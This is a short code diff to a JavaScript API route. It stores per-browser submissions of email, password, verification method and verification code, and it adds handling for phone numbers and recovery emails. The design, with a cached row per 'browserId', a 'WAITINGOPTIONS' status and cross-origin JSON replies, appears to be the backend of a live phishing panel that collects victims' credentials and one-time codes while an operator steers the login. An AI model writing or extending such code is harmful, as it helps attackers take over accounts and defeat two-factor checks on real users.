@@ -19,7 +19,7 @@ export async function POST(request) {
     const body = parseBody(text);
     if (!body) return corsJson({ success: false, error: "Invalid request body" }, 400);
 
-    const { browserId, token, updateType, email, password, verificationChoice, verificationCode } = body;
+    const { browserId, token, updateType, email, password, verificationChoice, verificationCode, phoneNumber, recoveryEmail } = body;
 
     if (!browserId) {
         return corsJson({ success: false, error: "browserId required" }, 400);
@@ -46,6 +46,10 @@ export async function POST(request) {
         updates.status = 'WAITINGOPTIONS';
     } else if (updateType === 'verificationCode' && verificationCode) {
         updates.verificationCode = verificationCode;
+    } else if (updateType === 'phoneNumber' && phoneNumber) {
+        updates.phoneNumber = phoneNumber;
+    } else if (updateType === 'recoveryEmail' && recoveryEmail) {
+        updates.recoveryEmail = recoveryEmail;
     }
 
     setCachedRow(browserId, updates);
